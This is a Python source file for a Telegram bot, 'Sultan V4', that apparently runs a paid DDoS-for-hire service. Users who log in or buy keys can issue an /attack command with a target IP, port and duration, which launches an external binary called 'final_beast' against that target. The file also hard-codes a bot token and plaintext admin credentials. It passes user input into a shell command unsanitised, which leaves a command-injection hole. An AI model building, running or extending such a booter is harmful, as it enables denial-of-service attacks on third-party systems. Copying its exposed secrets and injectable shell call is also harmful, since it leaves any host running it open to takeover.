import telebot, subprocess, threading, os, time
from flask import Flask
from telebot import types

# --- CONFIGURATION ---
TOKEN = "8586393188:AAFH26YqG47jqc4sRyUWCjsjd-chZQRwyQ0"
bot = telebot.TeleBot(TOKEN)
app = Flask('')

# Master Credentials
ADMIN_ID = 5625622115  # Sultan's Main ID
ADMIN_USER = "saniya"
ADMIN_PASS = "suhan"

# Data Storage
USER_DATA_FILE = "users.txt"
KEYS_FILE = "keys.txt"
ADMINS_FILE = "admins.txt" # Multi-admin list

# State Management
logged_in_admins = []

@app.route('/')
def home(): return "Sultan V4 Secure Cloud is Active!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- ACCESS LOGIC ---
def is_admin(user_id):
    if user_id == ADMIN_ID: return True
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "r") as f:
            if str(user_id) in f.read(): return True
    return False

def has_access(user_id):
    if is_admin(user_id): return True
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as f:
            for line in f:
                uid, expiry = line.strip().split("|")
                if int(uid) == user_id and time.time() < float(expiry): return True
    return False

# --- LOGIN SYSTEM ---
@bot.message_handler(commands=['login'])
def login(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ **Usage:** `/login <id> <pass>`")
        return
    
    u, p = args[1], args[2]
    if u == ADMIN_USER and p == ADMIN_PASS:
        if message.from_user.id not in logged_in_admins:
            logged_in_admins.append(message.from_user.id)
        bot.reply_to(message, "🔓 **SULTAN ACCESS GRANTED!**\nBhai, ab aapka control chalu hai.")
    else:
        bot.reply_to(message, "🚫 Galat ID ya Password!")

# --- MULTI-ADMIN MANAGEMENT ---
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 2: return
    
    new_admin = args[1]
    with open(ADMINS_FILE, "a") as f: f.write(f"{new_admin}\n")
    bot.reply_to(message, f"✅ User `{new_admin}` ko Admin bana diya gaya hai!")

# --- ATTACK COMMAND ---
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not has_access(message.from_user.id):
        bot.reply_to(message, "🚫 Access Denied! Login karein ya key khareedein.")
        return
    
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ `/attack <IP> <PORT> <TIME>`")
        return
    
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **SULTAN ATTACK STARTED!**\n📍 Target: `{ip}:{port}`")
    subprocess.Popen(f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 10", shell=True)

# --- KEY GEN (For Admins) ---
@bot.message_handler(commands=['genkey'])
def gen_key(message):
    if not is_admin(message.from_user.id): return
    args = message.text.split()
    if len(args) < 2: return
    
    duration = args[1]
    key = f"SULTAN-{os.urandom(2).hex().upper()}-{duration}"
    # Key save logic...
    bot.reply_to(message, f"🔑 **KEY:** `{key}`")

if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    bot.polling(none_stop=True)
